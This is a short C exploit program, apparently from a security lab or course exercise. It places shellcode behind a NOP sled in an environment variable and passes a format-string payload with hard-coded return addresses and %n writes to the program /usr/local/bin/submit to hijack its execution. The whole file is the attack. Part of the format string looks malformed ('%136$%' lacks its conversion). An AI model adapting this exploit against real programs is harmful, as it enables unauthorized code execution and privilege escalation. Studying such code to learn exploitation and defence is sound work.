/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define SUBMIT "/usr/local/bin/submit"
#define PAYLOAD_SIZE 280
#define NOP 0x90

int main(int argc, char **argv) {
	char *args[4], *ptr;
	char *envs[2];
	char *target = "\x9c\xd5\xbf\xff\x9e\xd5\xbf\xff\xaa\xaa%552c%135$n%10202c%136$%";
	char buf[PAYLOAD_SIZE];
	const int slen = strlen(shellcode);

	/* Construct the payload */
	memset(buf, NOP, PAYLOAD_SIZE);
	ptr = buf + 128;
	memcpy(ptr, shellcode, slen);

	/* Set up arguments */
	args[0] = "/usr/local/bin/submit";
	args[1] = target;
	args[2] = "string exploit";
	args[3] = NULL;

	/* Environment variable stores the payload */
	envs[0] = buf;
	envs[1] = NULL;

	return execve(args[0], args, envs);
}